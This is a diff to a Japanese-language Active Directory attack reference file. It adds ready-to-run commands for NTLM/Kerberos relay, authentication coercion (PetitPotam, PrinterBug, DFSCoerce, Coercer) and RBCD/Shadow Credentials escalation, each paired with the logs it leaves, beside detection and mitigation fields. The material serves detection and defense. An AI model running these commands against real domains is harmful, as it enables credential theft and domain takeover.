     "how": "Responder(SMB/HTTPは無効化)でハッシュ捕捉→ntlmrelayxがSMB署名無効のターゲットへ中継。中継元がローカル管理者権限を持てば -c でコマンド実行、--dump-samでSAM/LSA奪取、socks経由でセッション再利用。前提はターゲットのSMB署名が『無効/未必須』かつ中継アカウントに権限があること。自ホストへの折返し(reflection)はMS08-068以降不可。",
     "tools": "ntlmrelayx.py -tf targets.txt -smb2support -c/--dump-sam/-socks, Responder",
+    "cmd": [
+      {
+        "tool": "ntlmrelayx",
+        "t": "SMB署名無効ターゲット一覧へ中継し任意コマンドを実行。`-c`で渡したコマンド文字列がリレー先の4688にそのまま残る",
+        "q": "ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami /all'"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "中継成立後にsmbclient風の対話シェルを直接張る。単発コマンドより長時間張り付くSMBセッションとして残存する",
+        "q": "ntlmrelayx.py -tf targets.txt -smb2support -i"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "認証セッションをSOCKSプロキシとして保持し後続ツールで使い回す運用。プロキシ経由の445アクセスが分散して現れる",
+        "q": "ntlmrelayx.py -tf targets.txt -smb2support -socks"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "リレー先の暗号化ハッシュをコンソール表示・ファイル出力。`-dh`実行時は認証情報窃取が主目的である裏付けになる",
+        "q": "ntlmrelayx.py -tf targets.txt -smb2support -dh -of loot"
+      },
+      {
+        "tool": "Responder",
+        "t": "自前のSMB/HTTP応答を止め認証をそのまま通過させる中継前提の設定。Responder.confの`SMB = Off``HTTP = Off`が併用の合図",
+        "q": "python3 Responder.py -I eth0 -v"
+      }
+    ],
     "detect": "同一ソースから複数ホストへ連続するNTLM認証、非対話ログオン後の即時管理操作(サービス作成7045/PsExec)。中継はソースIPと認証プリンシパルの不一致が特徴。",
     "events": "4624 (Logon Type 3, NTLM), 4672, 7045 (サービス作成), 5140/5145 (共有アクセス)",
     "mitigate": "全ホストでSMB署名を必須化(サーバ/クライアント双方GPO: RequireSecuritySignature=1)。なおWindows 11 24H2は既定で受信・送信ともSMB署名を必須化、Windows Server 2025も送信を既定必須化しており多くのリレー経路が閉じたが、レガシー/サードパーティ製SMBサーバやHomeエディションは依然無防備なので個別に確認。加えてSMB Server EPA(Extended Protection for Authentication)を有効化し、CVE-2025-55234(2025年9月)で追加されたSMBハードニング監査イベントで署名/EPA未対応の端末を洗い出してから強制へ移行する。可能ならSMBクライアントの送信NTLMブロック(24H2)も併用。名前解決ポイズニング対策で入口を断ち、ローカル管理者共有権限を最小化、LAPSを導入。",
@@ -1792,6 +2998,38 @@ AD.I18N.ja.attacks = [
     "summary": "マシン/ユーザー認証をDCのLDAPへ中継し、RBCD設定・Shadow Credentials付与・コンピュータ作成・DCSync権限付与などドメイン特権化に直結させる。",
     "how": "強制認証(PetitPotam等)でDCのマシンアカウント認証を誘発→ntlmrelayxでldap(s)://DCへ中継。--delegate-accessで攻撃者制御のコンピュータにRBCD(msDS-AllowedToActOnBehalfOfOtherIdentity)を設定しS4U2selfでDCへ。あるいはmsDS-KeyCredentialLink書込(Shadow Credentials)でPKINIT。LDAP(非署名)はドロップザミック等でMIC無効化併用。前提: LDAP署名/チャネルバインディングが未強制。",
     "tools": "ntlmrelayx.py -t ldap://dc --delegate-access / --add-computer / --escalate-user, PetitPotam.py, gettgtpkinit/Rubeus",
+    "cmd": [
+      {
+        "tool": "ntlmrelayx",
+        "t": "強制認証で誘発したマシン認証をLDAPSへ中継。`--add-computer`で作成した攻撃者制御コンピュータへ`--delegate-access`でRBCDを設定",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --add-computer --delegate-access -smb2support"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "作成するコンピュータ名を固定した版。DCの4741(コンピュータオブジェクト作成)に指定した`ATTACKERPC`がそのまま残る",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --add-computer ATTACKERPC --delegate-access -smb2support"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "中継先LDAPの書込権限で対象ユーザーへDCSync相当のACLを付与。DACL変更の5136がDC側の決定的シグナル",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user svc_user -smb2support"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "msDS-KeyCredentialLinkにShadow Credentialsを書き込みPKINITの下地を作る。書込対象は`--shadow-target`の値としてそのまま残る",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --shadow-credentials --shadow-target svc_user -smb2support"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "強制認証を発火させDC$の認証をntlmrelayxへ誘導する側のコマンド。DC側では攻撃者ホストへの発信SMB/RPC接続として現れる",
+        "q": "python3 PetitPotam.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "書き込んだShadow Credentials(PFX)でPKINIT認証しTGTを取得。`asktgt` `/certificate`の組が4768のPKINIT監査ログと対応",
+        "q": "Rubeus.exe asktgt /user:svc_user /certificate:cert.pfx /password:'Passw0rd!' /nowrap /ptt"
+      }
+    ],
     "detect": "5136でmsDS-AllowedToActOnBehalfOfOtherIdentityやmsDS-KeyCredentialLinkの追加、新規コンピュータアカウント作成(4741)、ACL変更(5136 nTSecurityDescriptor)。DCのマシン認証が別ホスト起点で発生。",
     "events": "4624(NTLM), 4741(コンピュータ作成), 5136(RBCD/KeyCredential/ACL), 4662(DCSync)",
     "mitigate": "DCでLDAP署名必須(LDAPServerIntegrity=2)+LDAPSチャネルバインディング(EPA/LdapEnforceChannelBinding=2)必須化。Windows Server 2025のDCは新ポリシー『ドメインコントローラー: LDAPサーバー署名要件の適用』により既定でLDAP署名必須、既存環境もKB4520412のロードマップに沿ってチャネルバインディングを段階適用(監査イベント3074/3075で非対応クライアントを洗い出してから強制)。ms-DS-MachineAccountQuota=0。RBCD/KeyCredential属性の監査と特権保護。CVE-2017-8563パッチ適用。",
@@ -1832,6 +3070,23 @@ AD.I18N.ja.attacks = [
     "summary": "ExchangeのEWS PushSubscription等でExchangeサーバ自身の高権限マシン認証を強制し、LDAPへ中継してドメインへDCSync権限を付与する。",
     "how": "ExchangeのpushSubscriptionに攻撃者URLを登録するとExchange$がSYSTEM相当でHTTP NTLM認証を送出。これをntlmrelayxでLDAPへ中継し、Exchange既定の過剰権限(WriteDacl on domain)を利用して任意ユーザーにDCSync付与。前提: 未パッチExchangeと既定過剰ACL。",
     "tools": "privexchange.py, ntlmrelayx.py -t ldap://dc --escalate-user, httpattack",
+    "cmd": [
+      {
+        "tool": "PrivExchange",
+        "t": "Exchange$のEWS PushSubscriptionを悪用しSYSTEM相当のHTTP NTLM認証を強制。攻撃者URLへの1回限りのHTTP GETがトリガーの痕跡",
+        "q": "python privexchange.py -d corp.local -u svc_user -p 'Passw0rd!' -ah 10.0.0.5 exch01.corp.local"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "Exchangeの既定WriteDacl on domainを使い任意ユーザーへDCSync権限を付与。DC側5136のACL変更イベントが決定的な証跡",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user svc_user -smb2support"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "PrivExchangeが誘発したExchange$認証をSMBへ中継する代替経路。Exchangeサーバ自身がクライアントとして445接続する珍しい向きの通信になる",
+        "q": "ntlmrelayx.py -t smb://10.0.0.20 -smb2support -dh"
+      }
+    ],
     "detect": "ExchangeマシンアカウントによるLDAP書込、ドメインオブジェクトACL変更、EWSの異常なpush subscription登録。",
     "events": "5136(ACL/DCSync権限付与), 4662, Exchange EWSログ",
     "mitigate": "Exchange累積更新適用、Exchangeの過剰権限を削減(公式緩和スクリプト)、LDAP署名/EPA強制。CVE-2018-8581/2019-0724パッチ。",
@@ -1872,6 +3127,33 @@ AD.I18N.ja.attacks = [
     "summary": "MS-EFSRPC(暗号化ファイルシステムリモートプロトコル)のEfsRpc*関数を悪用し、DCを含む任意ホストに攻撃者UNCパスへのマシン認証を強制するCoercion。当初は認証不要で成立したが、CVE-2021-36942がEfsRpcOpenFileRawの匿名経路のみを封鎖したため、現在は有効なドメイン資格情報を用いた認証済みトリガとして他のEfsRpc*メソッド経由で残存する。",
     "how": "\\pipe\\lsarpcや\\pipe\\efsrpcへEfsRpcOpenFileRaw/EfsRpcEncryptFileSrv等にUNC(\\\\attacker\\share)を渡し、標的DC$のNTLM認証を攻撃者へ送らせる。初期版は匿名で成功したが、CVE-2021-36942はEfsRpcOpenFileRawの未認証経路のみを塞いだため、現在は有効なドメイン資格情報を持つアカウントから他のEfsRpc*メソッド経由で強制するのが一般的。さらにWindows 11 23H2/Server 2025ではEFS RPCサービスが既定で起動しないため、攻撃者は別プロトコルのCoercion手法に切り替えるか、共有への書き込み権限を用いてEFSサービスをオンデマンド起動させてから発火させる。ADCS ESC8やLDAPリレーと連結してドメイン奪取。前提: EFSRPC到達可能かつ起動済みのパイプ、リレー先の署名/EPA未強制。",
     "tools": "PetitPotam.py, Coercer, dementor.py, ntlmrelayx",
+    "cmd": [
+      {
+        "tool": "PetitPotam",
+        "t": "EfsRpcOpenFileRaw等をefsrパイプ経由で呼び出しDC$の認証を強制。`-pipe efsr`指定時のRPCバインド順序が最初の一撃",
+        "q": "python3 PetitPotam.py -pipe efsr 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "CVE-2021-36942修正後は匿名経路が塞がれたため有効な資格情報を指定して発火。`-u` `-p` `-d`を伴う認証済みRPC接続がパッチ環境での典型形",
+        "q": "python3 PetitPotam.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "efsrpcパイプが無効な環境向けにlsarpc相乗りで同じEfsRpc*関数を叩く代替経路。パイプ名だけが変わり挙動は同一",
+        "q": "python3 PetitPotam.py -pipe lsarpc -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "PetitPotam本体が検知/無効化された場合の代替実装。同じMS-EFSRPCメソッド群を`coerce`モードで自動選択して発火",
+        "q": "coercer coerce -u svc_user -p 'Passw0rd!' -d corp.local --target dc01.corp.local --listener-ip 10.0.0.5"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "強制認証の受け皿。DC$のNTLM認証がここへ着弾しLDAPSへ中継される。着弾側にはDC発の445/LDAP接続として現れる",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support"
+      }
+    ],
     "detect": "lsarpc/efsrpcパイプへのEfsRpc呼び出し(現行版は認証済みドメインアカウント起点)、DC$がリレー先ホストへ認証、直後の証明書要求。EFS RPCが既定停止の23H2/Server 2025ではサービスの突発的な起動も兆候。",
     "events": "5145(名前付きパイプアクセス lsarpc/efsrpc), 4624(DC$のNTLM), 4886/4768(ADCS連結時)",
     "mitigate": "CVE-2021-36942パッチ適用(未認証EfsRpcOpenFileRaw経路を封鎖)、EFSサービス不要なら無効化。Windows 11 23H2/Server 2025はEFS RPCが既定で無効化され攻撃面は縮小するが、認証済み経路は残るためNTLM制限が引き続き重要。DC/CAでNTLMを制限しKerberos強制、リレー先(LDAP/ADCS)でEPA/署名必須化。近年はSMB署名・LDAP署名・EPAが既定で有効化される方向にありリレー成立条件を狭めるが、既存環境では明示的に強制すること。RPCフィルタでEFSRPCをブロック。",
@@ -1912,6 +3194,33 @@ AD.I18N.ja.attacks = [
     "summary": "MS-RPRN(印刷スプーラRPC)のRpcRemoteFindFirstPrinterChangeNotificationExで、標的にプリンタ変更通知を装った認証を攻撃者へ送らせる元祖Coercion。",
     "how": "Spoolサービスが有効な標的(DC含む)へprinterbug.pyを実行し、DC$認証を攻撃者ホストへ誘発。取得認証をLDAP/ADCS/SMBへリレー、または制約なし委任ホストへ送りTGT奪取(Unconstrained Delegation攻撃と連結)。前提: Print Spoolerサービス稼働。",
     "tools": "SpoolSample.exe, printerbug.py (dementor派生), Coercer, ntlmrelayx/rubeus monitor",
+    "cmd": [
+      {
+        "tool": "SpoolSample.exe",
+        "t": "RpcRemoteFindFirstPrinterChangeNotificationExでDCの認証を強制。TARGET/CAPTURESERVERの2引数のみでDLLをメモリ内ロードしファイルは残さない",
+        "q": "SpoolSample.exe dc01.corp.local attacker.corp.local"
+      },
+      {
+        "tool": "printerbug.py",
+        "t": "Linux側からの同等実装。資格情報埋め込みの`domain/user:pass@target`形式が実行時の目印でDC側にはプロセスログが残らない",
+        "q": "printerbug.py 'corp.local/svc_user:Passw0rd!'@dc01.corp.local 10.0.0.5"
+      },
+      {
+        "tool": "dementor.py",
+        "t": "Exchangeサーバ狙いの派生実装。`-u` `-p` `-d`の後に攻撃者IP/標的の順で並ぶ独自の引数順が識別点",
+        "q": "python dementor.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 exch01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "Spoolerを含む複数プロトコルを自動試行する統合ツールでの同等発火。scanで応答確認後にcoerceへ進む2段構成が典型",
+        "q": "coercer coerce -u svc_user -p 'Passw0rd!' -d corp.local --target dc01.corp.local --listener-ip 10.0.0.5"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "制約なし委任ホストへ誘導した場合の後段。着弾したDC$のTGTをメモリから継続監視・自動抽出する",
+        "q": "Rubeus.exe monitor /interval:5 /nowrap"
+      }
+    ],
     "detect": "spoolssパイプへの外部RpcRemoteFindFirstPrinterChangeNotification呼び出し、DC$の外向き認証、Spoolerを名乗る想定外RPC。",
     "events": "5145(spoolssパイプ), 4624(マシンアカウントNTLM), Sysmon 3(異常な外向き接続)",
     "mitigate": "DC/重要サーバでPrint Spoolerサービス停止(PrintNightmare対策とも共通)。RPCフィルタでMS-RPRN制限、NTLM制限、リレー先の署名/EPA強制。",
@@ -1952,6 +3261,28 @@ AD.I18N.ja.attacks = [
     "summary": "MS-DFSNM(分散ファイルシステム名前空間管理)RPCを悪用し、DCのマシン認証を強制するCoercion。DFSはDC上で動くことが多く緩和が難しい。",
     "how": "\\pipe\\netdfs のNetrDfsAddStdRoot/NetrDfsRemoveStdRootにUNCパスを渡してDC$認証を誘発。PetitPotam/PrinterBugがパッチ・無効化された環境でも残るため代替Coercionとして重宝。ADCS/LDAPリレーへ連結。前提: DFSサービス(通常DCで稼働)到達可能。",
     "tools": "dfscoerce.py, Coercer, ntlmrelayx",
+    "cmd": [
+      {
+        "tool": "dfscoerce.py",
+        "t": "NetrDfsAddStdRoot/RemoveStdRootにUNCを渡しDC$認証を強制。DFSはDC上で常時稼働するため無効化しづらい攻撃面になる",
+        "q": "python3 dfscoerce.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "MS-DFSNMを含む複数手法をまとめて試すscanモード。PetitPotam等が塞がれた後の代替手法探索として使われる",
+        "q": "coercer scan -u svc_user -p 'Passw0rd!' -d corp.local --target dc01.corp.local"
+      },
+      {
+        "tool": "NetExec",
+        "t": "coerce_plusモジュールでDFSCoerce等の複数Coercion手法を一括判定。`-M coerce_plus`実行時は1接続に複数RPC試行がまとまって現れる",
+        "q": "netexec smb dc01.corp.local -u svc_user -p 'Passw0rd!' -M coerce_plus"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "誘発したDC$認証をLDAPSへ中継する受け側。着弾ログには10.0.0.5宛のDC発445/RPC接続として現れる",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support"
+      }
+    ],
     "detect": "netdfsパイプへの外部NetrDfs*呼び出し、DC$の外向き認証。",
     "events": "5145(netdfsパイプ), 4624(DC$ NTLM)",
     "mitigate": "RPCフィルタでMS-DFSNMを信頼元のみ許可、DCでのNTLM制限、リレー先EPA/署名必須化。根本はリレー先の無力化(署名/EPA)。",
@@ -1987,6 +3318,28 @@ AD.I18N.ja.attacks = [
     "summary": "MS-FSRVP(ファイル共有シャドウコピー)RPCを悪用したCoercion。File Server VSS Agentが有効なホストで機能する。",
     "how": "\\pipe\\FssagentRpc のIsPathSupported/IsPathShadowCopiedにUNCを渡し標的マシンの認証を誘発。MicrosoftはCVE-2022-30154(KB5014692, 2022年6月)で修正。この強制(RVSSエージェント)の副作用で正規のリモートVSS(SMB共有)が失敗する事象が生じ、KB5015527で案内・対応された。PetitPotam/PrinterBug等が塞がれた際の代替Coercionとして利用。前提: 'File Server VSS Agent Service'有効。",
     "tools": "shadowcoerce.py, Coercer, ntlmrelayx",
+    "cmd": [
+      {
+        "tool": "shadowcoerce.py",
+        "t": "IsPathSupported/IsPathShadowCopiedを叩きFile Server VSS Agent経由でマシン認証を強制。初回失敗時は同一コマンドの再実行が観測される",
+        "q": "python3 shadowcoerce.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "MS-FSRVPを含む網羅的scanモードでの応答確認。CVE-2022-30154(KB5014692)未パッチホストの洗い出しに使われる",
+        "q": "coercer scan -u svc_user -p 'Passw0rd!' -d corp.local --target dc01.corp.local"
+      },
+      {
+        "tool": "NetExec",
+        "t": "coerce_plusモジュールでShadowCoerce等の複数手法をまとめて試行。1回のSMB接続に複数RPC呼び出しが連続するのが特徴",
+        "q": "netexec smb dc01.corp.local -u svc_user -p 'Passw0rd!' -M coerce_plus"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "誘発した認証をSMBへ中継しハッシュ窃取まで直結させる受け側。File Server VSS Agent稼働ホストからの着弾として識別できる",
+        "q": "ntlmrelayx.py -tf targets.txt -smb2support -dh"
+      }
+    ],
     "detect": "FssagentRpcパイプへの外部呼び出し、想定外マシンの外向き認証。",
     "events": "5145(FssagentRpcパイプ), 4624",
     "mitigate": "不要なら'File Server VSS Agent Service'無効化、関連パッチ適用、RPCフィルタ。リレー先の署名/EPA強制。",
@@ -2022,6 +3375,28 @@ AD.I18N.ja.attacks = [
     "summary": "既知の全Coercionプロトコル(MS-EFSR/RPRN/DFSNM/FSRVP/MS-EVEN/PARなど数十メソッド)を自動探索・実行する統合ツール。",
     "how": "Coercerでscanモードにより標的で応答するCoercionメソッドを自動列挙し、coerceモードで一斉に認証強制。個別ツールが塞がれても網羅的に代替パイプ/関数を試行できるため、単一パッチでは防ぎきれない。ntlmrelayxと並行運用しADCS/LDAPへ。",
     "tools": "Coercer scan/coerce -t <target> -l <attacker>, ntlmrelayx",
+    "cmd": [
+      {
+        "tool": "Coercer",
+        "t": "対象で応答するCoercion手法(EFSR/RPRN/DFSNM/FSRVP/EVEN等)を自動列挙。scan実行は短時間の多数RPCバインド要求として現れる",
+        "q": "coercer scan -u svc_user -p 'Passw0rd!' -d corp.local --target dc01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "scanで有効と判定された手法を選び一斉に認証強制。`--listener-ip`宛のマシン認証がntlmrelayxの着弾ログと相関する",
+        "q": "coercer coerce -u svc_user -p 'Passw0rd!' -d corp.local --target dc01.corp.local --listener-ip 10.0.0.5"
+      },
+      {
+        "tool": "Coercer",
+        "t": "特定プロトコルのみに絞った発火。`--filter-protocol-name`で1手法に限定すると個別ツール実行時と同じRPC呼び出しパターンになる",
+        "q": "coercer coerce -u svc_user -p 'Passw0rd!' -d corp.local --target dc01.corp.local --listener-ip 10.0.0.5 --filter-protocol-name MS-EFSR"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "Coercerが集めた認証をまとめて中継する受け側。1台の攻撃機に複数プロトコル由来のマシン認証が短時間で着弾する",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support"
+      }
+    ],
     "detect": "短時間に複数のRPCパイプ(lsarpc/efsrpc/netdfs/spoolss/FssagentRpc等)へ連続アクセス、標的からの多発する外向き認証は自動スキャンの兆候。",
     "events": "5145(複数パイプ連続アクセス), 4624/4625多発",
     "mitigate": "根本対策はリレー先の無力化(SMB署名/LDAP署名+EPA/ADCS EPA)とNTLM全廃方針。RPCフィルタで各Coercionプロトコルを一括制限、不要サービス停止。",
@@ -2057,6 +3432,23 @@ AD.I18N.ja.attacks = [
     "summary": "NTLM認証のMIC(Message Integrity Check)を除去してもDCが受理する欠陥を悪用し、署名要求を回避してSMB→LDAP等のクロスプロトコルリレーを成立させる。",
     "how": "リレー中にNTLM_AUTHENTICATEのMICフィールドとネゴシエートフラグを改竄し、本来署名が必須なセッションでも中継可能にする。PetitPotam+ldapリレーの成功率を大きく上げる。ntlmrelayx --remove-micで実装。前提: CVE-2019-1040未パッチのDC/クライアント。",
     "tools": "ntlmrelayx.py --remove-mic, PetitPotam",
+    "cmd": [
+      {
+        "tool": "ntlmrelayx",
+        "t": "NTLM_AUTHENTICATEのMICを除去しネゴシエートフラグを改竄。`--remove-mic`実行時は本来拒否されるべき署名必須セッションでも中継が成立する",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local --remove-mic --escalate-user svc_user -smb2support"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "Drop the MICと組み合わせる強制認証側。DC$のNTLM認証を誘発しMIC除去済みのリレー先へ流し込む起点になる",
+        "q": "python3 PetitPotam.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "SMB側でも同様にMIC除去を試行。CVE-2019-1040パッチ適用済みDCでは拒否されるため成否がパッチ有無の切り分けに使える",
+        "q": "ntlmrelayx.py -tf targets.txt --remove-mic -smb2support"
+      }
+    ],
     "detect": "MIC欠落のNTLM認証、クロスプロトコル中継の痕跡(SMB起点でLDAP書込)。",
     "events": "4624(NTLM), 5136(RBCD/ACL変更)",
     "mitigate": "2019年6月以降の累積更新(CVE-2019-1040)適用。併せてLDAP署名/チャネルバインディング必須化、SMB署名必須化。",
@@ -2092,6 +3484,28 @@ AD.I18N.ja.attacks = [
     "summary": "CVE-2019-1040の修正回避としてMsvAvFlags操作でMIC検証を回避する続報脆弱性。署名/EPA保護をすり抜けリレーを成立させる。",
     "how": "NTLMのAV_PAIR(MsvAvFlags)を改竄しMIC必須ビットを落とすことで、パッチ後も一部条件で署名回避リレーを継続。ntlmrelayxの派生実装で利用。前提: 当該パッチ未適用。",
     "tools": "ntlmrelayx (改造版), impacket",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "MICを除去し署名要求を回避して中継。`--remove-mic`はCVE-2019-1040/1166系リレーに共通する決定的文字列",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local --remove-mic --escalate-user svc_user"
+      },
+      {
+        "tool": "Impacket",
+        "t": "MachineAccountQuotaで新規コンピュータを作成しRBCDへ委任権限を付与。`--add-computer`と`--delegate-access`の同時出現が高信号",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local --remove-mic --add-computer RELAYPC$ 'Passw0rd!' --delegate-access"
+      },
+      {
+        "tool": "Impacket",
+        "t": "SMB側への中継。パッチ未適用ホストでMICなしNTLMがそのまま受理され、DC以外からの445接続として現れる",
+        "q": "ntlmrelayx.py -t smb://10.0.0.20 --remove-mic"
+      },
+      {
+        "tool": "Responder",
+        "t": "認証を捕捉する送り手側。LLMNR/NBT-NS応答の直後にリレー先への短時間接続が続く",
+        "q": "responder -I eth0 -wrf"
+      }
+    ],
     "detect": "改竄されたAV_PAIRを持つNTLM認証、想定外クロスプロトコル中継。",
     "events": "4624(NTLM)",
     "mitigate": "CVE-2019-1166/CVE-2019-1338関連パッチ適用、LDAP/SMB署名+EPA必須化でリレー自体を無力化。",
@@ -2132,6 +3546,28 @@ AD.I18N.ja.attacks = [
     "summary": "標的のWebClient(WebDAV)サービスを起動させHTTP(NTLM)認証を強制。HTTPはSMB署名の影響を受けないためADCS ESC8等クロスプロトコルリレーに最適な経路を作る。",
     "how": "searchConnector-msや.url/.lnk、あるいはCoercer/PetitPotamでUNCをWebDAV形式(\\\\attacker@80\\path)にしてWebClient起動を誘発。HTTP認証はEPA未設定なら署名の制約なくADCS/HTTPへ中継可能。WebClient未起動ホストにはchange notify等で起動を誘発。前提: WebClientサービス(既定でWorkstationに存在)。",
     "tools": "Coercer (-web), PetitPotam (WebDAV), ntlmrelayx --adcs, WebClient起動用の.searchConnector",
+    "cmd": [
+      {
+        "tool": "Coercer",
+        "t": "WebDAV宛にHTTP認証を強制。`--webdav-host`指定時はSMBでなくポート80/HTTPの認証として現れ署名の制約を受けない",
+        "q": "Coercer.py coerce -u svc_user -p 'Passw0rd!' -d corp.local -t 10.0.0.50 --webdav-host attacker-pc --listener-ip 10.0.0.66"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "UNCパスに`@80`を付与しWebClient経由のHTTP認証を誘発。宛先ホスト名末尾の`@ポート番号`表記が固有の痕跡",
+        "q": "python3 PetitPotam.py -d corp.local -u svc_user -p 'Passw0rd!' dc01.corp.local '\\\\ATTACKER-PC@80\\x'"
+      },
+      {
+        "tool": "Impacket",
+        "t": "HTTP認証をADCS Web登録機能へ中継しマシン証明書を取得。`--adcs``--template`が固定的な文字列",
+        "q": "ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+      },
+      {
+        "tool": "cmd.exe",
+        "t": "WebClient未起動端末での手動誘発確認。初回のみ7045(サービスインストール)とWebClientサービス起動が対になる",
+        "q": "dir \\\\ATTACKER-PC@80\\x"
+      }
+    ],
     "detect": "WebClientサービスの予期せぬ起動、WebDAV(HTTP)経由の外向きNTLM、直後のADCS証明書要求。",
     "events": "4624(HTTP NTLM), 4886/4887(ADCS), Sysmon 1(svchost WebClient起動)",
     "mitigate": "不要ホストでWebClientサービスを無効化(GPO)。HTTP系リレー先(ADCS/IIS)でEPA必須化。ファイアウォールでWebDAV外向き制限。",
@@ -2172,6 +3608,28 @@ AD.I18N.ja.attacks = [
     "summary": "NTLMではなくKerberos認証を中継する新種攻撃。DNS/mDNSポイズニング等でSPNを攻撃者名義に解決させ、AP-REQを標的サービスへ転送する。",
     "how": "IP/名前解決を操作して被害者にHOST/攻撃者やLDAP/DC SPNのチケットを取得させ、取得したAP-REQをLDAP/SMB/ADCS等へ中継。ローカルではKrbRelayでLSAへ中継しRBCD/Shadow Credentialsを設定、SYSTEM昇格。NTLM無効環境でも通用する点が新しい。前提: SPN解決を操作できること、ターゲットの署名/バインディング不備。",
     "tools": "KrbRelay, KrbRelayUp, Rubeus, mitm6/Responder(SPN誘導)",
+    "cmd": [
+      {
+        "tool": "KrbRelay",
+        "t": "COMアクティベーションでLSAのKerberos認証をLDAPへ中継しRBCDを設定。`-spn ldap/``-rbcd`が固有文字列",
+        "q": "KrbRelay.exe -spn ldap/dc01.corp.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-1111111111-2222222222-3333333333-1104 -port 10"
+      },
+      {
+        "tool": "KrbRelay",
+        "t": "同一ホストのCIFSへ中継しSYSTEM相当のセッションを得る対話モード。`-session``-console`の組合せが目印",
+        "q": "KrbRelay.exe -spn cifs/host01.corp.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -console"
+      },
+      {
+        "tool": "mitm6",
+        "t": "IPv6/DNS応答詐称で名前解決を乗っ取り以後の接続先を誘導。`-d`指定ドメインへのDHCPv6大量応答が特徴",
+        "q": "mitm6 -d corp.local"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "中継成立後に発行されたTGTを監視・回収。`monitor`は4624相当の新規ログオンをポーリングし続けノイズが大きい",
+        "q": "Rubeus.exe monitor /interval:5 /nowrap"
+      }
+    ],
     "detect": "SPNと実ホストの不一致を伴うKerberos認証、想定外プリンシパルへのTGS要求、ローカルでのRBCD/KeyCredential即時設定。",
     "events": "4769(TGS要求), 5136(RBCD/KeyCredential), 4624",
     "mitigate": "LDAP署名+チャネルバインディング(EPA)必須化はKerberosリレーにも有効。名前解決ポイズニング対策、SMB署名必須、Kerberos armoring(FAST)、SPN解決経路の保護。",
@@ -2212,6 +3670,28 @@ AD.I18N.ja.attacks = [
     "summary": "ドメイン参加ホストの一般ユーザーがKerberosリレー+RBCDを組合せてローカルSYSTEMへ昇格するワンショット手法。",
     "how": "自ホストのマシンアカウント認証をローカルで捕捉しLDAPへ中継、攻撃者制御アカウントに対象マシンのRBCDを設定→S4U2self/proxyで対象マシンのCIFS/HOST SPNのサービスチケットを取得→SCM経由でSYSTEM実行。ms-DS-MachineAccountQuota>0が前提の典型パターン。",
     "tools": "KrbRelayUp, Rubeus, Whisker(KeyCredential版)",
+    "cmd": [
+      {
+        "tool": "KrbRelayUp",
+        "t": "自ホストのマシン認証をローカルLDAPへ中継し新規コンピュータへRBCDを設定。`relay -c -cn`が定番の並び",
+        "q": "KrbRelayUp.exe relay -d corp.local -c -cn KRBRELAYUP$ -cp 'Passw0rd!'"
+      },
+      {
+        "tool": "KrbRelayUp",
+        "t": "RBCDでなくShadow Credentials方式で昇格。`-m shadowcred`は既存msDS-KeyCredentialLinkを書き換える痕跡",
+        "q": "KrbRelayUp.exe relay -d corp.local -m shadowcred -f"
+      },
+      {
+        "tool": "Whisker",
+        "t": "同じ攻撃面を手動操作する単体ツール。`/target`のコンピュータ名指定と生成される.pfxが固有",
+        "q": "Whisker.exe add /target:host01$ /domain:corp.local /dc:dc01.corp.local /path:C:\\\\Windows\\\\Temp\\\\cert.pfx /password:Passw0rd!"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "RBCD設定後にS4U2self/proxyでSYSTEM相当のチケットを取得し注入。`/msdsspn``/ptt`が最終段の痕跡",
